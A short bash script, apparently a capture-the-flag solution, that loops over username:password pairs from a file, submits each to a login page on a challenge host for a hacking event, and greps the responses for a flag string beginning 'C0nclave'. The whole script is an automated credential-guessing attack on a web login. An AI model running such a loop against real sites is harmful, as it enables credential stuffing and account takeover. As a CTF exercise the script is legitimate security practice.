#!/bin/bash

while IFS=':' read -r user pass; do
	curl -sX GET "http://navarracybertalent.thehackerconclave.es:31508/index.php?username=$user&password=$pass" | grep C0nclave
done < webuser.txt
